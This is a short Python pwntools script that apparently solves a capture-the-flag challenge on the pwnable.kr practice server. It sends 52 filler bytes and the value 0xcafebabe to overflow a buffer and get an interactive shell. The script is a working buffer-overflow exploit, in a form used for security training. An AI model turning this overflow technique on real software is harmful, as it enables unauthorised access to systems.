from pwn import *

r = remote('pwnable.kr', 9000)

key = 0xcafebabe

payload = 'j' * 52 + p32(key)

r.sendline(payload)
r.interactive()
